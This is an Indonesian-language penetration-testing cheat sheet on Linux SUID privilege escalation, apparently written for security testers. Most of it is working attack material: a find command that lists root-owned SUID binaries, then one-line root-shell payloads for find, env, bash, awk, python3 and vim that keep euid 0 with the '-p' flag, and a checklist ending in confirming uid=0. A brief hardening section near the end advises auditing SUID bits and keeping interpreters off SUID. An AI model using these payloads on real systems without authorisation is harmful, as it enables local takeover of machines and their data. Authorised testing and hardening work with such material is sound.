# SUID — Payload Shell Cheat Sheet

> **Tujuan:** Deteksi binary ber-SUID milik root dan spawn shell dengan privilege root (euid=0) dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `find`, [GTFOBins](https://gtfobins.github.io)

---

## Penjelasan Singkat

**SUID (Set User ID)** adalah bit permission pada file Unix/Linux yang menyebabkan binary dieksekusi dengan **effective UID (euid)** pemilik file. Jika binary SUID dimiliki **root**, penyerang dapat memperoleh **root shell**.

| Item | Detail |
|------|--------|
| **Cara Deteksi** | `find / -perm -4000 -type f 2>/dev/null` |
| **Ciri Khas** | Bit `s` pada permission (`-rwsr-xr-x`) |
| **Hasil Eksploitasi** | Shell dengan `euid=0(root)` |

---

## Langkah 1: Deteksi & Identifikasi

```bash
# Enumerasi seluruh binary SUID milik root
find / -perm -4000 -type f 2>/dev/null

# Verifikasi bit SUID (huruf "s" pada permission)
ls -la /usr/bin/find
# Output: -rwsr-xr-x 1 root root ... /usr/bin/find
#         ^ bit "s" menandakan SUID (berjalan sebagai root)
```

Contoh output enumerasi:

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
```

---

## Langkah 2: Payload Shell per Binary (GTFOBins → SUID)

```bash
# find — spawn shell via -exec
find . -name "x" -exec /bin/sh -p \;

# env — preserve euid
env /bin/sh -p

# bash — flag -p mempertahankan euid
bash -p

# awk — jalankan shell via system()
awk 'BEGIN{system("/bin/sh -p")}'

# python3 — setuid(0) lalu exec shell
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'

# vim — shell escape dari command mode
vim -c ':!/bin/sh -p'
```

| Binary | Payload | Catatan |
|--------|---------|---------|
| `find` | `-exec /bin/sh -p \;` | Shell dijalankan dengan euid root |
| `env` | `env /bin/sh -p` | Preserve euid via env |
| `bash` | `bash -p` | Mempertahankan euid |
| `awk` | `system("/bin/sh -p")` | Spawn shell via awk |
| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
| `vim` | `:!/bin/sh -p` | Shell escape command-mode |

> **Catatan Privilege Drop:** Shell `/bin/sh` (dash) sering **menurunkan privilege** secara otomatis saat euid ≠ ruid. Solusinya gunakan flag `-p` (privilege preserve) atau binary yang melakukan `execve` langsung seperti `env` dan `find`.

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Audit Rutin SUID** Lakukan audit berkala pada seluruh binary ber-SUID (`find / -perm -4000`) dan hapus bit SUID yang tidak diperlukan (`chmod u-s <binary>`).
- **Gunakan Allowlist** Batasi SUID hanya pada binary minimal esensial (`passwd`, `sudo`, `su`).
- **Hindari Binary Interpreting** Jangan berikan bit SUID pada interpreter (python, perl, ruby, node, vim, awk) karena semuanya bisa spawn shell.

---

## Checklist Penetration Testing SUID

- [ ] Enumerasi SUID dengan `find / -perm -4000 -type f 2>/dev/null`
- [ ] Identifikasi binary SUID milik root (`ls -la <binary>`)
- [ ] Cek setiap binary di [GTFOBins](https://gtfobins.github.io) → bagian **SUID**
- [ ] Pilih payload shell yang sesuai dengan binary yang ditemukan
- [ ] Gunakan flag `-p` agar euid tidak turun (dash-drop)
- [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`
- [ ] Dokumentasikan temuan dan langkah mitigasi